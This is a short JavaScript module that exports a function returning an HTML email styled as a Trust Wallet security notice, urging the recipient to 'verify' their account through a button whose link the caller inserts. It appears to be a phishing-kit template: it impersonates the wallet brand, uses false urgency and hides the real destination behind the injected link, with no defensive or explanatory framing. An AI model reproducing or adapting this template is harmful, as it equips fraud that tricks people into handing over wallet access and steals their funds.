exports.trustTemplate = (link) => {
    return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Your Trust Wallet Account</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
        }

        .email-container {
            background-color: #ffffff;
            margin: 30px auto;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.15);
            max-width: 600px;
            text-align: center;
        }

        .logo {
            width: 120px;
            margin-bottom: 20px;
        }

        h1 {
            color: #003366;
            font-size: 24px;
        }

        p {
            color: #555555;
            font-size: 16px;
            line-height: 1.5;
            margin: 15px 0;
        }

        .cta-button {
            background-color: #003366;
            color: #ffffff;
            padding: 15px 30px;
            border-radius: 5px;
            text-decoration: none;
            font-size: 16px;
            display: inline-block;
            margin: 20px 0;
        }

        .cta-button:hover {
            background-color: #0055cc;
        }

        .footer {
            font-size: 14px;
            color: #777777;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="email-container">
        <img src="https://i.pinimg.com/736x/6c/3c/74/6c3c744dd40d28853c29f90692d1312e.jpg" alt="Trust Logo" class="logo">
        <h1>Secure Your Trust Wallet Account</h1>
        <p>Dear user,</p>
        <p>
            We've detected an action that requires immediate verification to secure 
            your Trust Wallet account. Please take a moment to verify your account 
            and ensure its safety.
        </p>
        <a href="${link}" class="cta-button">Secure My Account</a>
        <p class="footer">
            If you did not initiate this action, you can safely ignore this email. For any questions, 
            please contact our support team.
        </p>
        <p>Thank you for using Trust Wallet!</p>
    </div>
</body>
</html>`
}